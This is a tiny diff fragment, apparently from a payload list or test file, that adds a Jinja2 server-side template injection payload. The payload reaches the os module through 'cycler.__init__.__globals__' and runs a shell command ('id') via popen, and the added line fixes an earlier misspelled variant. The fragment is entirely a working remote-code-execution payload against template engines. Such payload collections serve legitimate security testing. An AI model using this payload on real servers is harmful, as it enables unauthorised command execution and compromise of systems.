@@ -8,3 +8,5 @@
 
 
 {{ cycler._init_.__globals__.os.popen('id').read() }}
+
+{{ cycler.__init__.__globals__.os.popen('id').read() }}
